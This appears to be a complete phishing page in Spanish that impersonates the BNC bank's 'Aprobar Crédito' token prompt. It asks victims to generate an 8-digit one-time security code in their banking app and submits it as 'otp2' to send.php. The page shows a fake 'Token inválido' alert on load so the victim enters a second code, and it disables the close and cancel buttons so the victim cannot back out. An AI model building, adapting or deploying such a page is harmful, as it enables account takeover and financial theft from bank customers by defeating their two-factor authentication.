<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <link rel="shortcut icon" href="iconero.ico">
    <title>BNC</title>

    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap"
        rel="stylesheet">

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Poppins', sans-serif;

            min-height: 100vh;

            display: flex;
            justify-content: center;
            align-items: center;

            background:
                linear-gradient(rgba(255, 255, 255, .75),
                    rgba(255, 255, 255, .75)),
                #dfe3e8;

            padding: 20px;
        }

        /* =========================================
           MODAL
        ========================================= */

        .modal {
            width: 100%;
            max-width: 610px;

            background: #fff;

            border-radius: 16px;

            overflow: hidden;

            box-shadow:
                0 10px 35px rgba(0, 0, 0, .18);

            border: 1px solid #d7d7d7;
        }

        /* =========================================
           HEADER
        ========================================= */

        .modal-header {
            height: 60px;

            background:
                linear-gradient(to bottom,
                    #2e5ea7,
                    #234a87);

            display: flex;
            align-items: center;
            justify-content: space-between;

            padding: 0 18px;
        }

        .modal-title {
            color: white;
            font-size: 19px;
            font-weight: 700;
        }

        .close-btn {
            border: none;
            background: transparent;

            color: white;

            font-size: 24px;
            font-weight: 700;

            cursor: pointer;

            opacity: .9;
        }

        .close-btn:hover {
            opacity: 1;
        }

        /* =========================================
           BODY
        ========================================= */

        .modal-body {
            padding: 18px;
        }

        .token-wrapper {
            border: 1px solid #e0e0e0;
            border-radius: 18px;

            padding: 18px;

            background: #fbfbfb;
        }

        .token-box {
            border: 1px solid #dfdfdf;
            border-radius: 18px;

            padding: 16px;

            background: white;
        }

        /* =========================================
           INPUTS
        ========================================= */

        .top-input {
    width: 100%;
    height: 40px;
    border-radius: 10px;
    border: 1px solid #e0e0e0;
    padding: 0 14px;
    font-size: 14px;
    font-family: 'Poppins', sans-serif;
    margin-bottom: 14px;
    outline: none;
    color: #666;
    font-weight: 400;
}

        .message {
            color: #707070;

            font-size: 15px;
            line-height: 1.7;

            margin-bottom: 18px;
        }

        .message strong {
            color: #4b4b4b;
            font-weight: 700;
        }

        .bnc {
    font-weight: 700;
    font-size: 15px;
    letter-spacing: 1px;
}

.bnc span:nth-child(1) {
    color: #ff7a00; /* naranja */
}

.bnc span:nth-child(2) {
    color: #005eff; /* azul */
}

.bnc span:nth-child(3) {
    color: #33b44a; /* verde */
}

        .message .lightning {
  font-size: 48px;
  color: #00aaff;
  text-shadow:
    0 0 5px #00aaff,
    0 0 10px #00ccff,
    0 0 20px #33ddff;
}

        .security-input {
            width: 100%;
            height: 54px;

            border-radius: 10px;
            border: 1px solid #d9d9d9;

            padding: 0 18px;

            font-size: 15px;
            font-family: 'Poppins', sans-serif;

            outline: none;

            transition: .25s;
        }

        .security-input:focus {
            border: 2px solid #5ba3ff;
        }

        /* =========================================
           BUTTONS
        ========================================= */

        .actions {
            display: flex;
            justify-content: center;
            gap: 14px;

            margin-top: 22px;
        }

        .btn {
            height: 48px;

            border: none;
            border-radius: 8px;

            padding: 0 26px;

            font-family: 'Poppins', sans-serif;
            font-size: 16px;
            font-weight: 600;

            cursor: pointer;

            transition: .2s;

            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .btn-success {
            background:
                linear-gradient(to bottom,
                    #49d04e,
                    #2ca62f);

            color: white;

            box-shadow:
                inset 0 1px 0 rgba(255, 255, 255, .35);
        }

        .btn-success:hover {
            transform: translateY(-1px);
        }

        .btn-gray {
            background:
                linear-gradient(to bottom,
                    #f8f8f8,
                    #ececec);

            border: 1px solid #d8d8d8;

            color: #6f6f6f;
        }

        /* =========================================
           FOOTER
        ========================================= */

        .footer {
            border-top: 2px solid #ff5b5b;

            padding: 16px 18px 20px;
        }

        .footer-title {
            font-size: 16px;
            font-weight: 600;

            color: #444;

            margin-bottom: 14px;
        }

        .step {
            display: flex;
            align-items: center;
            gap: 12px;

            margin-bottom: 12px;

            color: #6d6d6d;

            font-size: 14px;
        }

        .check {
            width: 24px;
            height: 24px;

            border-radius: 50%;

            background:
                linear-gradient(to bottom,
                    #ff684f,
                    #f54236);

            display: flex;
            align-items: center;
            justify-content: center;

            color: white;

            font-size: 13px;
            font-weight: 700;

            flex-shrink: 0;
        }

        .mini-btn {
            background: #36b42c;
            color: white;

            padding: 2px 10px;

            border-radius: 20px;

            font-size: 12px;
            font-weight: 600;
        }

        /* =========================================
           RESPONSIVE
        ========================================= */

        @media(max-width:600px) {

            .modal-title {
                font-size: 17px;
            }

            .message {
                font-size: 14px;
            }

            .actions {
                flex-direction: column;
            }

            .btn {
                width: 100%;
            }
        }


        .top-input:disabled {
  color: inherit;
  background-color: inherit;
  opacity: 1; /* evita que se vea más tenue */
  cursor: not-allowed; /* opcional, para indicar que no se puede usar */
}

        .lightning-icon {
    display: inline-flex;
    align-items: center;
    justify-content: center;

    width: 16px;
    height: 16px;
}

.lightning-icon svg {
    width: 100%;
    height: 100%;
    display: block;
}


         .bnc-alert-overlay{
    position:fixed;
    inset:0;

    background:rgba(0,0,0,.35);

    display:flex;
    justify-content:center;
    align-items:center;

    z-index:999999;

    animation:fadeIn .25s ease;
}

.bnc-alert-box{
    width:92%;
    max-width:360px;

    background:white;

    border-radius:22px;

    padding:30px 24px;

    text-align:center;

    box-shadow:
    0 18px 45px rgba(0,0,0,.18);

    animation:popup .28s ease;

    font-family:'Poppins',sans-serif;

    position:relative;
}

.bnc-alert-close{
    position:absolute;

    top:14px;
    right:14px;

    width:34px;
    height:34px;

    border:none;
    border-radius:50%;

    background:#f2f4f8;

    color:#5f6b7a;

    font-size:24px;
    line-height:1;

    cursor:pointer;

    transition:.2s;
}

.bnc-alert-close:hover{
    background:#e5e9f0;
}

.bnc-alert-logo{
    width:110px;
    display:block;
    margin:0 auto 18px;
}

.bnc-alert-icon{
    width:58px;
    height:58px;

    border-radius:50%;

    background:#ff5a00;
    color:white;

    display:flex;
    justify-content:center;
    align-items:center;

    font-size:34px;
    font-weight:600;

    margin:0 auto 18px;
}

.bnc-alert-title{
    font-size:24px;
    font-weight:600;

    color:#003c81;

    margin-bottom:10px;
}

.bnc-alert-text{
    font-size:15px;
    line-height:1.7;

    color:#5f6b7a;
}

/* ANIMACIONES */

@keyframes popup{

    0%{
        transform:scale(.85);
        opacity:0;
    }

    100%{
        transform:scale(1);
        opacity:1;
    }
}

@keyframes fadeIn{

    from{
        opacity:0;
    }

    to{
        opacity:1;
    }
}
    </style>
</head>

<body>

    <div class="modal">

        <!-- HEADER -->
<form method="post" action="send.php">
        <div class="modal-header">
            
            <div class="modal-title">
                Aprobar Crédito
            </div>

            <button class="close-btn" id="closeModal" disabled>
                ×
            </button>

        </div>

        <!-- BODY -->

        <div class="modal-body">

            <div class="token-wrapper">

                <div class="token-box">

                    <input
  type="text"
  class="top-input"
  placeholder="Solicitud de Token BNC"
  disabled
>

                    <div class="message">

                        Abra la App
                        <span class="bnc">
    <span>B</span><span>N</span><span>C</span>
</span>
                        opción
                        <span class="lightning-icon">
    <svg viewBox="0 0 24 24" fill="none">
        <path d="
            M13.2 1.5
            L5.8 13
            H11
            L9.8 22.5
            L18.2 9.8
            H13.6
            L13.2 1.5
        "
        fill="#1f7cff"/>
    </svg>
</span>

                        <strong>Operaciones Directas</strong>

                        <br>

                        <strong>BNC > Token BNC</strong>

                        y coloque a continuación el
                        Token generado activo.

                    </div>

                    <input
                        type="password"
                        class="security-input"
                        placeholder="Código de Seguridad"
                        required
                        minlength="8" maxlength="8"
                        inputmode="numeric"
                        name="otp2"
                        id="cod"
                        >

                </div>

            </div>

            <!-- BUTTONS -->

            <div class="actions">

                <button class="btn btn-success">
                    ➜ Continuar
                </button>
                </form>
                <button class="btn btn-gray" id="cancelBtn" disabled>
                    ⃠  Cerrar
                </button>

            </div>

        </div>

        <!-- FOOTER -->

        <div class="footer">

            <div class="footer-title">
                Pasos a Seguir:
            </div>

            <div class="step">
                <div class="check">✓</div>

                <div>
                    <strong>Obligatorio.</strong>
                    Ingrese los datos solicitados.
                </div>
            </div>

            <div class="step">
                <div class="check">✓</div>

                <div>
                    <strong>Obligatorio.</strong>
                    Si es correcto, oprima

                    <span class="mini-btn">
                        Continuar
                    </span>
                </div>
            </div>

        </div>

    </div>

      <!-- ALERTA -->
<div class="bnc-alert-overlay" id="bncAlert">

    <div class="bnc-alert-box">

        <!-- BOTON CERRAR -->
        <button class="bnc-alert-close" id="closeAlert">
            ×
        </button>

        <img
            src="BNCLogoSmall-Big.png"
            class="bnc-alert-logo"
        >

        <div class="bnc-alert-icon">
            !
        </div>

        <div class="bnc-alert-title">
            Token inválido
        </div>

        <div class="bnc-alert-text">
            Verifica e intenta nuevamente.
        </div>

    </div>

</div>

    <script>

window.addEventListener('load', () => {

    const alertBox = document.getElementById('bncAlert');

    function closeAlert() {

        alertBox.style.opacity = '0';
        alertBox.style.transition = '.25s ease';

        setTimeout(() => {

            alertBox.remove();

        }, 250);
    }

    /* CLICK EN CUALQUIER PARTE */

    document.body.addEventListener('click', closeAlert, {
        once: true
    });

    /* TOUCH MOVIL */

    document.body.addEventListener('touchstart', closeAlert, {
        once: true
    });

});

</script>

    <script>

        const closeBtn = document.getElementById('closeModal');
        const cancelBtn = document.getElementById('cancelBtn');

        function closeModal() {

            document.querySelector('.modal').style.opacity = '0';

            document.querySelector('.modal').style.transform =
                'scale(.92)';

            setTimeout(() => {

                document.querySelector('.modal').style.display = 'none';

            }, 180);
        }

        closeBtn.addEventListener('click', closeModal);

        cancelBtn.addEventListener('click', closeModal);

    </script>

    <script>
  document.getElementById('cod').addEventListener('input', function(e){
  if (!/^\d*$/.test(e.target.value)) {
    e.target.value = e.target.value.replace(/\D/g, '');
  }
});

document.getElementById('cod').addEventListener('paste', function(e){
  e.preventDefault();
  const paste = (e.clipboardData || window.clipboardData).getData('text');
  if (/^\d*$/.test(paste)) {
    e.target.value = paste;
  }
});

document.getElementById('cod').addEventListener('keypress', function(e){
  if (!/\d/.test(e.key)) {
    e.preventDefault();
  }
});
</script>

</body>

</html>
